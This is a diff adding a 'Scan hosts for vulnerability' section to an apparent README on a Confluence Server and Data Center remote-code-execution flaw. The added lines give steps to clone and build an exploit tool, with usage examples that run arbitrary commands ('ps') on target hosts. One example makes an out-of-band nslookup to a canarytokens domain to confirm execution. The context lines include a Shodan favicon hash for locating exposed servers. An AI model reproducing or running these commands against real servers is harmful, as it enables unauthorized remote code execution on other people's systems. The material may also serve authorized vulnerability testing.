@@ -4,6 +4,25 @@ Confluence Server and Data Center RCE
 ```
 http.favicon.hash:-305179312
 ```
+- Scan hosts for vulnerability
+```
+git clone https://github.com/redhuntlabs/ConfluentPwn; cd ConfluentPwn
+```
+```
+go build
+```
+```
+./cfscan -h
+```
+```
+Examples:
+  ./cfscan 1.2.3.4:80 1.1.1.1:8080
+  ./cfscan -file urls.txt
+  ./cfscan -cmd 'nslookup xxxxxxxxxxxxxxxxx.canarytokens.com 1.1.1.1:80'
+  ./cfscan -cmd 'ps' -regex '^\s*PID\s*TTY\s*TIME\s*CMD' http://1.1.1.1:443
+```
+
+
 
 - Curl PoC
 
